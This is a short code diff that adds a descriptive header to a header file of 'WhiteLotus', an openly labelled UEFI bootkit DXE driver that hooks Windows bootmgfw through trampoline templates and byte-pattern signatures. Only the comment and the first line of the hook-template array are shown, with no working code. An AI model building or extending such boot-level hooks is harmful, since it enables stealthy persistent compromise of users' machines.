@@ -1,3 +1,27 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+ *  File     : PatchBootMgfw.h
+ * ============================================================
+ *
+ *  Description:
+ *    Defines the x64/IA-32 trampoline hook template bytes,
+ *    address-offset constants, ImgArchStartBootApplication
+ *    function typedef variants (Vista and Win8+), byte-pattern
+ *    signatures, and the global backup state for the bootmgfw
+ *    hook installation.
+ *
+ *  Purpose:
+ *    - Share hook template and signature constants between
+ *      PatchBootMgfw.c and WhiteLotus.c.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "WhiteLotus.h"
 
 CONST UINT8 gHookTemplate[] =
